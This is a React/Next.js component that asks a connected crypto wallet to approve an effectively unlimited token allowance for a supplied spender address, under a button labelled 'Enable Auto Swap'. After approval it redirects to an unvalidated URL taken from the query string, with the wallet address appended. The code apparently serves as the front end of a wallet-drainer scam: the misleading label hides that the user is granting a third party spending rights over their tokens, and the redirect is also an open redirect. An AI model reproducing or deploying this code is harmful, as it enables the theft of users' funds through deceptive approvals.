// pages/ApproveButton.js
import React, { useEffect, useState } from "react";
import {
  createThirdwebClient,
  getContract,
  prepareContractCall,
  sendTransaction,
  readContract,
} from "thirdweb";
import {
  useActiveAccount,
  useReadContract,
  useSwitchActiveWalletChain,
  useActiveWalletChain,
  useWaitForReceipt,
} from "thirdweb/react";
import { useRouter } from "next/router";
import { polygon, avalanche, base, bsc } from "thirdweb/chains";
import styles from "./ApproveButton.module.css";
import Spinner from "./Spinner";
import { usdtAbi } from "../abis/usdtabi";
import networkTokenMapping from "../config/networkTokenMapping.js";

const client = createThirdwebClient({
  clientId: process.env.NEXT_PUBLIC_THIRDWEB_CLIENT_ID,
});

const chainMapping = {
  polygon,
  avalanche,
  base,
  bsc,
};

const normalizeNetwork = (network) => {
  switch (network?.toLowerCase()) {
    case "binance":
      return "bsc";
    default:
      return network?.toLowerCase();
  }
};

const ApproveButton = ({ isAccountFlagged, setApprovalStatus, selectedNetwork, spender, contractAddress, chainId, selectedTokenConfig }) => {
  const router = useRouter();
  const [redirectUrl, setRedirectUrl] = useState(null);
  const account = useActiveAccount();
  const address = account?.address;
  const switchChain = useSwitchActiveWalletChain();
  const activeChain = useActiveWalletChain();
  const currentChainId = activeChain?.id;
  const [transactionHash, setTransactionHash] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isAllowed, setIsAllowed] = useState(false);
  const selectedChain = chainMapping[normalizeNetwork(selectedNetwork)];

  // Move all hooks to the top level
  const isUSDTOnPolygon = selectedNetwork?.toLowerCase() === "polygon" && 
                         selectedTokenConfig?.name?.toLowerCase() === "usdt";

  const contract = getContract({
    client,
    chain: selectedChain,
    address: contractAddress,
    abi: usdtAbi,
  });

  const { data: allowance, isLoading: isChecking, refetch: refetchAllowance } = useReadContract({
    contract,
    method: "allowance",
    params: [address, spender],
    queryOptions: { enabled: !!address && !!spender && !!contract },
  });

  const requiredAllowance = BigInt("10000000000000000000000000000000");

  const { data: receipt, isLoading: isWaitingForReceipt } = useWaitForReceipt({
    client,
    chain: selectedChain,
    transactionHash,
  });

  useEffect(() => {
    if (router.isReady && !redirectUrl) {
      const queryRedirectUrl = router.query["redirect-url"];
      if (queryRedirectUrl && typeof queryRedirectUrl === "string") {
        setRedirectUrl(queryRedirectUrl.startsWith("http") ? queryRedirectUrl : `https://${queryRedirectUrl}`);
      }
    }
  }, [router.isReady, router.query, redirectUrl]);

  useEffect(() => {
    if (isUSDTOnPolygon) {
      setIsAllowed(true);
      setApprovalStatus({ isApproved: true, isError: false });
    }
  }, [isUSDTOnPolygon, setApprovalStatus]);

  useEffect(() => {
    const checkApprovalStatus = async () => {
      if (!address || !spender || !contract || isChecking) return;

      try {
        const updatedAllowanceResponse = await refetchAllowance();
        const updatedAllowance = updatedAllowanceResponse?.data;

        if (updatedAllowance !== null && BigInt(updatedAllowance) >= requiredAllowance) {
          if (!isAllowed) {
            setIsAllowed(true);
            setApprovalStatus({ isApproved: true, isError: false });
          }
        } else {
          if (isAllowed) {
            setIsAllowed(false);
            setApprovalStatus({ isApproved: false, isError: false });
          }
        }
      } catch (err) {
        console.error("Error checking approval status:", err);
        setIsAllowed(false);
        setApprovalStatus({ isApproved: false, isError: true });
      }
    };

    checkApprovalStatus();
  }, [address, spender, contract, refetchAllowance, isChecking, requiredAllowance, isAllowed, setApprovalStatus]);

  useEffect(() => {
    if (receipt) {
      const checkAllowanceWithRetry = async (retries = 3, delay = 5000) => {
        for (let i = 0; i < retries; i++) {
          await new Promise((resolve) => setTimeout(resolve, delay));

          const updatedAllowanceResponse = await refetchAllowance();
          const updatedAllowance = updatedAllowanceResponse.data;

          if (updatedAllowance && BigInt(updatedAllowance) >= requiredAllowance) {
            setIsAllowed(true);
            setApprovalStatus({ isApproved: true, isError: false });

            if (redirectUrl && address) {
              setTimeout(() => {
                window.location.href = `${redirectUrl}/${address}`;
              }, 1000);
            }
            return;
          }
        }

        setIsAllowed(false);
        setApprovalStatus({ isApproved: false, isError: true });
      };

      checkAllowanceWithRetry();
    }
  }, [receipt, refetchAllowance, setApprovalStatus, redirectUrl, address, requiredAllowance]);

  useEffect(() => {
    if (!isWaitingForReceipt && transactionHash) {
      setIsLoading(false);
    }
  }, [isWaitingForReceipt, transactionHash]);

  const callApproval = async () => {
    if (address && contract && !isAllowed && !isLoading && !isChecking) {
      setIsLoading(true);
      try {
        if (currentChainId !== selectedChain.id) {
          try {
            await switchChain(selectedChain);
          } catch (switchError) {
            console.error("Failed to switch network:", switchError);
            setIsLoading(false);
            setApprovalStatus({ isApproved: false, isError: true, message: "Network switch failed."});
            return;
          }
        }

        const transaction = prepareContractCall({
          contract,
          method: "approve",
          params: [spender, requiredAllowance],
        });

        const { transactionHash: txHash } = await sendTransaction({
          account,
          transaction,
        });

        setTransactionHash(txHash);

      } catch (err) {
        setIsLoading(false);
        setApprovalStatus({ isApproved: false, isError: true, message: "Approval was declined or failed." });
      }
    }
  };

  if (isUSDTOnPolygon) {
    return null;
  }

  if (isAccountFlagged && address) {
    return <div>Your wallet has been flagged. Cannot approve {selectedTokenConfig.symbol}</div>;
  }

  const showSpinner = (isLoading || isChecking || isWaitingForReceipt) && !isAllowed;

  if (address && !isAllowed) {
    if (showSpinner) {
      return <Spinner />;
    }

    return (
      <button onClick={callApproval} className={styles.connectedButton}>
        Enable Auto Swap {selectedTokenConfig.symbol}
        <img 
          src={selectedTokenConfig.icon} 
          alt={selectedTokenConfig.name} 
          className={styles.svgIcon} 
        />
      </button>
    );
  }

  return null;
};

export default ApproveButton;